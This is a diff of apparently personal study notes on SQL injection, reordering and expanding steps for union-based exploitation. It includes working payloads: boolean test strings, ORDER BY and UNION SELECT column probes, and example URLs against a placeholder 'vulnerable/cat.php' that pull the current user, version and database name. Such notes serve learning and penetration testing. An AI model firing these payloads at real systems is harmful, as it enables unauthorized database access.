@@ -68,13 +68,16 @@
 			d. for eg: test' & '1'='1 => ( user = test' & '1'='1' & id = 4 )
 			e. This will give same result ?? Now try this test' & '0'='1 => Error so we have found SQL injection on this parameter. Now comes exploitation phase.
 
-	4. This works for MySQL the methodology is different for other databases, the values 1,2,3,... should be changed to null,null,null, ... for database that need the same type of value in the 2 sides of the UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to be used, the table dual can be used to complete the request: UNION SELECT null,null,null FROM dual
-
 # Exploitation of SQL injection
 	1. After inspecting parameters where injection is reflected we need to Detect number of columns for Union based sql injection 
 		a. ORDER BY 1 ORDER BY 1,2 ... If at any point this query throws error, that means there are X-1 number of columns.(Where X is the column number which thrown error)
 		b. UNION SELECT 1,2,3 ... Can also detect how many columns are there.
-	2. Retrieve Information
+
+	2. When we want to retrieve any information, if its a string based info, we need to find a column which is compatible with string based datatype. Therefore, we need to trial&test all columns, if they can fit in string.FOr eg: union select null,database(),null...union select database(),null,null...union select null,null,database()
+
+	3. This works for MySQL the methodology is different for other databases, the values 1,2,3,... should be changed to null,null,null, ... for database that need the same type of value in the 2 sides of the UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to be used, the table dual can be used to complete the request: UNION SELECT null,null,null FROM dual
+
+	4. Retrieve Information
 		a. current_user() => http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4
 		b. version() =>  http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4 => Here @@version is used, remember this.
 		c. database()  => http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4
